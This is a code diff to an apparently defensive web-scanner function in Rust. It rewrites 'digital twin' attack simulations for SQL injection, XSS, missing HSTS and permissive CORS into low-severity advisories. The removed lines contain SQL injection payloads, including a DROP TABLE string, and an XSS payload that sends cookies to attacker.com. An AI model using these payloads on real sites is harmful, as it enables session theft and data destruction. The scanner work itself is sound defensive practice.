@@ -66,61 +66,53 @@ pub async fn run_digital_twin_result(target: &str) -> EngineResult {
             "twin_profile": serde_json::Value::Object(twin_profile.clone())
         }));
 
-        // Phase 2: Simulate attack scenarios based on profile
-        // Simulate SQLi if forms or APIs detected
+        // Phase 2: Risk scenarios from live profile (advisory only — not stored as confirmed vulns)
         if content_type.contains("html") || content_type.contains("json") {
             findings.push(json!({
                 "type": "digital_twin",
-                "title": format!("Simulation: SQL Injection attack path against {}", base),
-                "severity": "high",
+                "category": "risk_scenario",
+                "title": format!("Advisory: SQLi test path for {}", base),
+                "severity": "info",
                 "mitre_attack": "T1190",
                 "description": format!(
-                    "Digital Twin simulation predicts SQL injection attack path via web forms/API. \
-                    Server '{}' with {} content type. Recommended test: probe all input parameters \
-                    with payloads: ' OR '1'='1, 1; DROP TABLE users--, UNION SELECT NULL,NULL,NULL--",
+                    "Digital Twin profile suggests validating SQL injection on forms/API (server={}, content-type={}). \
+                    Run bola_idor, semantic_ai_fuzz, or http_feedback_fuzz for live confirmation.",
                     server, content_type
                 ),
                 "value": base,
-                "simulation": "sqli",
-                "attack_path": ["Reconnaissance", "Initial Access via SQLi", "Data Exfiltration"]
+                "scenario": "sqli",
             }));
         }
 
-        // Simulate XSS if no CSP
         if !has_csp {
             findings.push(json!({
                 "type": "digital_twin",
-                "title": format!("Simulation: XSS attack path (no CSP) against {}", base),
-                "severity": "high",
+                "category": "risk_scenario",
+                "title": format!("Advisory: XSS risk (no CSP) on {}", base),
+                "severity": "info",
                 "mitre_attack": "T1059.007",
                 "description": format!(
-                    "Digital Twin simulation: Content-Security-Policy header is absent on {}. \
-                    XSS attack simulation predicts high success probability. \
-                    Simulated payload: <script>document.location='https://attacker.com/?c='+document.cookie</script>",
+                    "Content-Security-Policy is absent on {}. Validate with ssti/semantic_ai_fuzz engines.",
                     base
                 ),
                 "value": base,
-                "simulation": "xss",
-                "attack_path": ["Injection via user input", "Session hijacking", "Lateral movement"]
+                "scenario": "xss",
             }));
         }
 
-        // Simulate MITM if no HSTS
         if !has_hsts {
             findings.push(json!({
                 "type": "digital_twin",
-                "title": format!("Simulation: SSL Strip / MITM attack path (no HSTS) against {}", base),
-                "severity": "medium",
+                "category": "risk_scenario",
+                "title": format!("Advisory: MITM/ssl-strip risk (no HSTS) on {}", base),
+                "severity": "info",
                 "mitre_attack": "T1557",
                 "description": format!(
-                    "Digital Twin simulation: HSTS is not enforced on {}. \
-                    SSL Strip attack simulation: attacker on same network can downgrade HTTPS to HTTP, \
-                    intercepting credentials and session tokens. Simulated success probability: HIGH.",
+                    "HSTS not enforced on {}. Validate transport with pki_tls engine.",
                     base
                 ),
                 "value": base,
-                "simulation": "sslstrip",
-                "attack_path": ["Network positioning", "SSL strip", "Credential capture"]
+                "scenario": "sslstrip",
             }));
         }
 
@@ -134,17 +126,16 @@ pub async fn run_digital_twin_result(target: &str) -> EngineResult {
             if origin_val == "*" {
                 findings.push(json!({
                     "type": "digital_twin",
-                    "title": format!("Simulation: CORS misconfiguration attack against {}", base),
-                    "severity": "high",
+                    "category": "risk_scenario",
+                    "title": format!("Advisory: permissive CORS on {}", base),
+                    "severity": "info",
                     "mitre_attack": "T1557",
                     "description": format!(
-                        "Digital Twin simulation: CORS is configured as Access-Control-Allow-Origin: * on {}. \
-                        Any origin can make credentialed cross-origin requests, enabling data exfiltration \
-                        from authenticated user sessions.",
+                        "Access-Control-Allow-Origin: * observed on {}. Confirm impact with oauth_oidc or bola_idor.",
                         base
                     ),
                     "value": base,
-                    "simulation": "cors",
+                    "scenario": "cors",
                     "cors_policy": origin_val
                 }));
             }
@@ -153,7 +144,7 @@ pub async fn run_digital_twin_result(target: &str) -> EngineResult {
 
     EngineResult::ok(
         findings.clone(),
-        format!("DigitalTwin: {} simulation scenarios generated for {}", findings.len(), base),
+        format!("DigitalTwin: {} profile/risk advisories for {}", findings.len(), base),
     )
 }
 
